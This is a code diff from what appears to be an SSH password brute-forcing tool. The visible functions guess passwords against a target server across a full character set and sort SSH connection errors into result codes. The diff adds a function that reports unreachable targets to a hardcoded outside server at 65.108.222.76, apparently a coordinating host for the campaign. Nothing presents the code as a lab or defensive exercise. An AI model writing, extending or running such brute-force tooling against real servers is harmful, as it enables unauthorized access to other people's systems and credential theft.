@@ -62,6 +62,13 @@ def send_timeout_to_server(target_ip):
     return response
 
 
+def send_ban_to_server(target_ip):
+    url = "http://65.108.222.76:5000/ban"
+    data = {"target_ip": target_ip}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(url, json=data, headers=headers)
+    return response
+
 def brute_force_password(server_ip):
     start_time = time.time()
     alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
@@ -74,9 +81,6 @@ def brute_force_password(server_ip):
             print({"ip": server_ip, "guess": guess})
             result = brute(server_ip, guess)
             if result == 0:
-                return
-
-            if result == 4:
                 return
             
             if result == 1:
@@ -127,8 +131,9 @@ def ssh_login(server_ip, username, password):
             return 6  # Connection timed out
         
         elif "Unable to connect to port 22" in str(e):
+            send_ban_to_server(server_ip)
             return 4
-        
+                
         else:
             return 0  # Other SSHException occurred
 
@@ -140,6 +145,9 @@ def ssh_login(server_ip, username, password):
 
         if "timed out" in str(e):
             return 6  # Connection timed out
+        
+        elif "Unable to connect to port 22" in str(e):
+            return 4
 
         return 0  # Other exceptions occurred
 
